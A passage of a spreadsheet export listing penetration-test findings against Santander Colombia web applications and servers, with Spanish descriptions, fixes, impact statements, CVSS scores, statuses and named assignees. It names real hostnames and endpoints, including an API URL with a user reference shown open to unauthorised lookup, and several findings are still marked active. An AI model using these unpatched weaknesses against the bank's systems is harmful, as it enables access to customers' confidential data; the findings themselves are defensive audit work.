contra el servidor._x000a_Gracias a un proxy, podría paralizarse la petición, obtener la contraseña, y desechar la petición._x000a__x000a_Debe tenerse en cuenta que un usuario malintencionado, al tener acceso a una cuenta logueada, podría modificar sin problema la contraseña del usuario impersonado._x000a_Si bien se ha considerado que esta vulnerabilidad tiene un riesgo medio, deberá tenerse en cuenta que obtener la contraseña de un usuario logueado podría conllevar a vulnerabilidades de mayor riesgo."/>
    <s v="Se deberá analizar en profundidad el uso que hace la aplicación de los valores de la Base de Datos, sanitizando cada input de la aplicación y verificando que no se puedan acceder a datos de otros campos mediante referencias a los mismos._x000a_A la hora de modificar la contraseña de un usuario logueado, se deberá solicitar el campo de “Contraseña actual”, y no ser cargado directamente"/>
    <s v="La obtención de la contraseña de un usuario logado en la aplicación gracias a la acción de un usuario_x000a_malintencionado ante un ataque físico contra el dispositivo que esté haciendo uso de la aplicación o_x000a_que consiga que la víctima caiga en un ataque por el que se retorne una sesión logueada, conlleva a_x000a_la falta total de confidencialidad, afectando también a la disponibilidad e integridad de la cuenta._x000a_Una mala implementación de la funcionalidad de cambio de contraseña permite recuperar la misma_x000a_dentro de una sesión de un usuario logado"/>
    <s v="1° Fecha: 17/10/2024"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="266"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-6650597dc382686af2c81198"/>
    <s v="CO-24-CNMPO-006-AP-003"/>
    <x v="144"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.1"/>
    <m/>
    <m/>
    <s v="api.stg.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <n v="760"/>
    <d v="2024-06-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <s v="Se ha detectado una URL de la API, (https://api.stg.mb.cdt.santander.com.co/mb-api-pse/v1/cdt/informationpaymentCdt?id-reference=(NºREF)), a través de la cual se puede consultar el estado del CDT del usuario logado en la sesión. Por ejemplo: https://api.stg.mb.cdt.santander.com.co/mb-api-pse/v1/cdt/informationpaymentCdt?id-reference=00650100000040683671_x000a__x000a_Se ha podido comprobar, que, desde cualquier usuario, se podría tener acceso al estado de los CDT de otros usuarios, simplemente utilizando la URL indicada y un token de sesión en uso._x000a__x000a_Se puede observar, que el usuario de la sesión actual tiene un CDT: 00650100000040683710_x000a__x000a_Utilizando el token de sesión actual y la URL vulnerable, el usuario podría acceder a información de los CDT de otros usuarios_x000a__x000a_Una vez hecha la comprobación del usuario a los datos de su CDT, utilizando la misma petición y realizando la consulta sobre los números de CDT de terceros, se podría tener acceso a esta información restringida sin problemas. De modo que se tendría acceso a información confidencial, se podrían enumerar CDT y tener acceso al estado de los mismos."/>
    <s v="Se recomienda introducir mecanismos de validación mediante token de inicio de sesión únicos, así como validación de acceso basado en usuarios y roles, para acceder a la información autorizada."/>
    <s v="Un usuario malintencionado puede acceder a información no autorizada para el nivel de acceso que dispone, o incluso acceder a información restringida perteneciente a otros usuarios de la aplicación."/>
    <m/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="267"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="MAN-665715e33d46490637cd2103"/>
    <s v="CO-24-CNMPO-007-AP-001"/>
    <x v="145"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2024-05-27T00:00:00"/>
    <n v="757"/>
    <d v="2024-09-24T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que el servidor realiza una consulta DNS cuando se envían ciertas peticiones HTTP sobre el aplicativo. A continuación, se muestra la petición HTTP que genera esta iteración con ciertos servidores DNS externos_x000a__x000a_Por otro lado,  se identifica la información recogida por el DNS cuando el servidor HTTP realiza la consulta."/>
    <s v="Se recomienda, en caso de no ser necesario, deshabilitar la configuración del servidor para que no se le permita realizar consultas DNS a un servidor externo. En su lugar configurar el servidor afectado para que utilice un servidor DNS interno o de la DMZ."/>
    <s v="Dado que el servidor remoto realiza una consulta DNS existen ciertos datos del sistema que inició la consulta que quedarían expuestos en el servidor DNS controlado por un atacante. De esta manera, un atacante podría obtener más información sobre el equipo remoto, por ejemplo la dirección IP del mismo. Otro riesgo asociado a este tipo de vulnerabilidad es que se puede utilizar el sistema afectado como proxy para el envío de payloads tipo DNS o incluso como proxy en técnicas de exfiltración de datos vía DNS. En ambos casos la dirección del Servidor DNS del atacante permanece oculta y se mostraría la dirección IP del servidor afectado como originaria del ataque."/>
    <s v="1° Fecha: 31/10/2024"/>
    <s v="Para revisión con SDS México"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="268"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-665049dbc382686af2c7f540"/>
    <s v="CO-24-CNMPO-006-AP-002"/>
    <x v="146"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="8.9"/>
    <m/>
    <m/>
    <s v="api.stg.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <n v="760"/>
    <d v="2024-06-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <s v="Durante las pruebas realizadas, se ha podido comprobar que la aplicación no restringe la subida a ficheros infectados con malware._x000a_Se han encontrado diferentes puntos de subida de documentos, donde el archivo subido no se comprueba y por tanto podrían suponer un vector idóneo para la subida y dispersión de malware. Pasan a enumerarse_x000a__x000a_https://api.stg.mb.cdt.santander.com.co/mb-api-doc-manager/v4/documents_x000a__x000a_Vector 2:_x000a_Durante el proceso de registro a través de: https://www.stg.mb.cdt.santander.com.co/stc/onboarding/registration/personal-data, en los últimos pasos de contratación del CDT, al igual que en el vector anterior, en algunas ocasiones concretas (dependerá de algunas características, como tipo de riesgo, etc.), la aplicación puede solicitar la subida de documentos en PDF._x000a_A través de esta subida, se consiguió subir ficheros Eicar. Como puede comprobarse, aunque el vector de inicio es diferente, la URL final de subida de documentos es la misma que en el ejemplo anterior: https://api.stg.mb.cdt.santander.com.co/mb-api-doc-manager/v4/documents._x000a__x000a_Estos ficheros, sirven de apoyo a los gestores a la hora del estudio de la petición de creación de un CDT, por parte de los usuarios._x000a_Como puede comprobarse en la siguiente imagen, un gestor puede acceder al documento y abrirlo sin problema con el considerable riesgo que supondría de tratarse de un fichero con malware real"/>
    <s v="Se recomienda establecer un paso intermedio en el proceso de la subida de ficheros, por ejemplo, implementar un sistema de tipo &quot;sandbox&quot; donde se analice el archivo subido en busca de malware. Establecer una función de comprobación y validación de los ficheros que los usuarios suben a la aplicación."/>
    <s v="Podría llegar a ejecutarse código en el lado servidor de la aplicación. Además de convertir el sitio web en un punto de dispersión de malware."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="269"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-66505afdc382686af2c81199"/>
    <s v="CO-24-CNMPO-006-CO-004"/>
    <x v="106"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.1"/>
    <m/>
    <m/>
    <s v="stg.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <n v="760"/>
    <d v="2024-09-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la auditoría, se han encontrado documentos descargables dentro de la aplicación, que contienen metadatos con información, como software, usuarios, etc._x000a_Se recomienda una revisión de los mismos, para la eliminación de estos metadatos._x000a__x000a_Evidencias:_x000a_Durante el proceso de apertura de un CDT, nos encontramos con el requisito de aceptación de “Reglamento del producto CDT”._x000a__x000a_Este documento que debe de ser aceptado, debe de ser descargado y leido por el usuario que esta realizando la apertura del CDT._x000a_Después de descargar el documento y analizarlo, se observa que contiene metadatos, con el nombre del creador de dicho documento._x000a_https://www.stg.mb.cdt.santander.com.co/assets/SB_CO/es-CO/documents/v1/CO.SAN.TRADICIONAL.CDT.REGULATION.pdf_x000a__x000a_"/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos generados y/o publicados en la aplicación. Además, se recomienda implementar un procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los mismos no contengan información sensible de la organización en sus metadatos."/>
    <s v="La información contenida en los metadatos de los archivos identificados podría ser utilizada por un atacante para obtener un mayor entendimiento de la organización, y así planificar ataques de ingeniería social o phishing dirigidos a determinados usuarios."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="270"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-66505debc382686af2c8119c"/>
    <s v="CO-24-CNMPO-006-CO-005"/>
    <x v="147"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="stg.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <n v="760"/>
    <d v="2024-09-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A continuación, se puede ver que el servidor esta potencialmente afectado por la vulnerabilidad Lucky13 en los siguientes dominios:_x000a_Si el servidor admite cifrados CBC, es potencialmente vulnerable._x000a_https://www.stg.mb.cdt.santander.com.co/_x000a__x000a_"/>
    <s v="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 https://www.openssl.org/source/_x000a_"/>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hechos a mano, también conocido como el &quot;Lucky Thirteen&quot; de emisión. Un atacante puede aprovechar la vulnerabilidad indicada para descifrar el tráfico entre un cliente y el website y ver todo el intercambio de información que se produzca entre ellos."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="271"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-66506025c382686af2c8119e"/>
    <s v="CO-24-CNMPO-006-CO-006"/>
    <x v="148"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="desarrollo.pse.com.co"/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <n v="760"/>
    <d v="2024-09-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor que sustenta la aplicación revelan información interna acerca de la tecnología utilizada por el servidor._x000a_https://desarrollo.pse.com.co/SampleFE/TransactionPage.aspx?transactionid=4125452_x000a__x000a_"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de la misma. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto. En este caso concreto, se recomienda eliminar las cabeceras con información, de las respuestas del servidor."/>
    <s v="Conocer la versión y tipo del software que se está ejecutando en el activo analizado permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas. De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="272"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-66506103c382686af2c811a0"/>
    <s v="CO-24-CNMPO-006-AP-007"/>
    <x v="149"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2"/>
    <m/>
    <m/>
    <s v="stg.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <n v="760"/>
    <d v="2024-09-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se detecta la función “Autocompletar” activa:_x000a_https://www.stg.mb.cdt.santander.com.co/stc/onboarding/registration/personal-data"/>
    <s v="Se recomienda añadir la directiva &quot;autocomplete=off&quot; en todos los campos que contengan información sensible que vaya a ser enviada a la aplicación para evitar que esta información sea cacheada y posteriormente recuperada por un tercero con acceso al navegador del usuario."/>
    <s v="Un usuario que haga uso de esta funcionalidad en un ordenador público, o que sea utilizado por terceros, permitiría al siguiente usuario del puesto ver los datos introducidos para acceder a la aplicación."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="273"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="SSO Prospera"/>
    <s v="MAN-66699603bb0dea0e40ef2e33"/>
    <m/>
    <x v="4"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-06-12T00:00:00"/>
    <n v="741"/>
    <d v="2024-10-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos_x000a_en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes_x000a_intermedios obtener encabezados HTTP de texto sin formato._x000a_A modo de evidencia, se muestra el resultado de la herramienta &quot;testssl” sobre el servidor afectado_x000a_prospera.santanderconsumer.co que muestra que el activo es vulnerable a BEAST"/>
    <s v="Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible._x000a_Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de_x000a_cifrado que no usan algoritmos de cifrado por bloque (CBC)."/>
    <s v="La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información_x000a_sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como_x000a_identificadores de sesión del usuario, credenciales, etc."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="274"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="MAN-666994c9bb0dea0e40ef2d8d"/>
    <m/>
    <x v="4"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-06-12T00:00:00"/>
    <n v="741"/>
    <d v="2024-10-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos_x000a_en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes_x000a_intermedios obtener encabezados HTTP de texto sin formato._x000a_A modo de evidencia, se muestra el resultado de la herramienta &quot;testssl” sobre el servidor afectado_x000a_sso-management.servicios.santanderconsumer.co que muestra que el activo es vulnerable a_x000a_BEAST"/>
    <s v="Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible._x000a_Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de_x000a_cifrado que no usan algoritmos de cifrado por bloque (CBC)."/>
    <s v="La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información_x000a_sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como_x000a_identificadores de sesión del usuario, credenciales, etc."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="275"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="MAN-66699564bb0dea0e40ef2dcb"/>
    <m/>
    <x v="150"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.5"/>
    <m/>
    <m/>
    <s v="prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-06-12T00:00:00"/>
    <n v="741"/>
    <d v="2024-10-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A continuación se muestra la evidencia de la herramienta &quot;testssl&quot; que demuestra que la renegociación insegura se encuentra habilitada en el sistema remoto"/>
    <s v="Se recomienda deshabilitar la opción de &quot;Renegociación insegura iniciada por el cliente&quot; en el_x000a_fichero de configuración del servidor. De manera alternativa se recomienda mantener las librerías_x000a_TLS/SSL actualizadas a la última versión disponible."/>
    <s v="Un atacante remoto no autenticado puede aprovechar la vulnerabilidad de &quot;Renegociación insegura_x000a_SSL iniciada por el cliente&quot; para inyectar una cantidad arbitraria de texto sin formato en el principio_x000a_de la secuencia de protocolo de aplicación, que podría facilitar los ataques man-in-the-middle. De_x000a_esta manera, el atacante tendría acceso a la información transmitida e, incluso, podría llegar a_x000a_modificarla."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="276"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="SSO Prospera"/>
    <s v="MAN-666995c5bb0dea0e40ef2e11"/>
    <m/>
    <x v="150"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.5"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-06-12T00:00:00"/>
    <n v="741"/>
    <d v="2024-10-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A continuación se muestra la evidencia de la herramienta &quot;testssl&quot; que demuestra que la renegociación insegura se encuentra habilitada en el sistema remoto"/>
    <s v="Se recomienda deshabilitar la opción de &quot;Renegociación insegura iniciada por el cliente&quot; en el_x000a_fichero de configuración del servidor. De manera alternativa se recomienda mantener las librerías_x000a_TLS/SSL actualizadas a la última versión disponible."/>
    <s v="Un atacante remoto no autenticado puede aprovechar la vulnerabilidad de &quot;Renegociación insegura_x000a_SSL iniciada por el cliente&quot; para inyectar una cantidad arbitraria de texto sin formato en el principio_x000a_de la secuencia de protocolo de aplicación, que podría facilitar los ataques man-in-the-middle. De_x000a_esta manera, el atacante tendría acceso a la información transmitida e, incluso, podría llegar a_x000a_modificarla."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="277"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="QA-WAS-a02e993a-2331-4215-9ac6-735ce85f8354"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="https://api.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2024-09-06T00:00:00"/>
    <n v="655"/>
    <d v="2024-12-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede estar enmarcada, lo que significa que es posible que se produzcan ataques de clickjacking contra los usuarios."/>
    <s v="Los mecanismos de prevención de clickjacking incluyen:_x000a_- X-Frame-Options: este encabezado de respuesta HTTP se puede utilizar para evitar el enmarcado de páginas web._x000a_- Content-Security-Policy: la directiva 'frame-ancestors' se puede utilizar para evitar el enmarcado de páginas web._x000a_- Código JavaScript Framekiller diseñado para evitar que un usuario malintencionado enmarque la página. Este método no se recomienda debido a su poca fiabilidad._x000a_Consulte la hoja de trucos de defensa contra el secuestro de clics de OWASP para obtener más información._x000a_Para evitar un error común de implementación de X-Frame-Options, consulte https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger"/>
    <s v="Con el clickjacking, un atacante puede engañar a un usuario víctima para que haga clic en un marco invisible en la página web, provocando así que la víctima realice una acción que no tenía intención de realizar."/>
    <m/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="278"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-66e8470b845f3141b2eafcd9"/>
    <s v="CO-24-CNMPA-010-CO-001"/>
    <x v="114"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/webclient/Login.xhtml"/>
    <m/>
    <m/>
    <d v="2024-09-16T00:00:00"/>
    <n v="645"/>
    <d v="2024-12-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="se ha observado que la cookie asociada a la gestión de la sesión, “incap_ses_XXXX_YYYYYYY” del usuario no tienen aplicado el atributo de seguridad &quot;HttpOnly&quot;. Este atributo impide el robo del identificador de sesión del usuario almacenado en la cookie mediante ataques de Cross Site Scripting, ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX)."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de estos dentro de la aplicación."/>
    <m/>
    <s v="Certificada"/>
    <s v="Cesar Augusto Garzón Puentes"/>
  </r>
  <r>
    <n v="279"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-66e8484c845f3141b2eafcda"/>
    <s v="CO-24-CNMPA-010-CO-002"/>
    <x v="151"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/webclient/Login.xhtml"/>
    <m/>
    <m/>
    <d v="2024-09-16T00:00:00"/>
    <n v="645"/>
    <d v="2025-01-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que el servidor web incluye en la cabecera &quot;Content Security Policy&quot; en las respuestas HTTP del servidor el parámetro 'unsafe-inline'._x000a__x000a_"/>
    <s v="Para implementar correctamente esta cabecera es necesario realizar un análisis completo de la aplicación web y observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Policy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). Un ejemplo de configuración de cabecera es el siguiente: • Content-Security-Policy: default-src 'self' *.trusted.com Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una políticapor ejemplo:_x000a__x000a_&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&gt; Para obtener una referencia completa acerca de todas las directivas &quot;Content Security Policy&quot; se recomienda visitar los siguientes enlaces: • https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP • https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"/>
    <s v="La incorrecta configuración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s v="Sin definir"/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="280"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-66e8492f845f3141b2eafcdb"/>
    <s v="CO-24-CNMPA-010-CO-003"/>
    <x v="118"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/webclient/Login.xhtml"/>
    <m/>
    <m/>
    <d v="2024-09-16T00:00:00"/>
    <n v="645"/>
    <d v="2025-01-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el atributo de seguridad &quot;secure&quot;. Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;secure&quot;. De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de estos dentro de la aplicación."/>
    <m/>
    <s v="Certificada"/>
    <s v="Cesar Augusto Garzón Puentes"/>
  </r>
  <r>
    <n v="281"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-66e84a96845f3141b2eafcdc"/>
    <s v="CO-24-CNMPA-010-CO-004"/>
    <x v="152"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/webclient/Login.xhtml"/>
    <m/>
    <m/>
    <d v="2024-09-16T00:00:00"/>
    <n v="645"/>
    <d v="2025-01-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-10-02T00:00:00"/>
    <s v="Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones, el cual es vulnerable a Breach"/>
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento. 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A continuación, se muestra como se deshabilita la compresión HTTP para Apache y NGINX:_x000a_ • Deshabilitar compresión en Apache: _x000a_o Deshabilite el módulo mod_deflate utilizando el siguiente comando: _x000a_$ sudo a2dismod deflate _x000a_o Reinicie el servidor: _x000a_$ sudo /etc/init.d/apache2 restart _x000a_• Deshabilitar compresión en NGINX: o Establezca la configuración del host con la opción gzip en off:_x000a_server { server_name www.example.com; listen 443 ssl http2; gzip off; }"/>
    <s v="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
    <m/>
    <m/>
    <s v="Cesar Augusto Garzón Puentes"/>
  </r>
  <r>
    <n v="282"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-66e84b88845f3141b2eafcdd"/>
    <s v="CO-24-CNMPA-010-CO-005"/>
    <x v="153"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/webclient/Login.xhtml"/>
    <m/>
    <m/>
    <d v="2024-09-16T00:00:00"/>
    <n v="645"/>
    <d v="2025-01-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13"/>
    <s v="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 https:/www.openssl.org/source/"/>
    <s v="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Sin definir"/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="283"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-66e84e9b845f3141b2eafcde"/>
    <s v="CO-24-CNMPO-011-AP-001"/>
    <x v="154"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/webclient/ActivityReport.xhtml"/>
    <m/>
    <m/>
    <d v="2024-09-16T00:00:00"/>
    <n v="645"/>
    <d v="2024-12-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-10-02T00:00:00"/>
    <s v="La aplicación auditada divulga información acerca de direcciones IP utilizadas por el portal web en la dirección URL https://servicios.santander.com.co/webclient/ActivityReport.xhtml"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento interno del servidor, como puede ser direccionamiento IP de la red interna en la que está ubicado el mismo."/>
    <s v="Un atacante podría utilizar esta vulnerabilidad para obtener información del direccionamiento IP del sistema, pudiendo llegar a localizar otros activos vulnerables en la red o mapear la red interna."/>
    <m/>
    <s v="Certificada"/>
    <s v="Cesar Augusto Garzón Puentes"/>
  </r>
  <r>
    <n v="284"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-66e2e9c0845f3141b2ea2927"/>
    <s v="CO-24-CNMPA-009-CO-001"/>
    <x v="117"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://recidam.olimpiait.com"/>
    <m/>
    <m/>
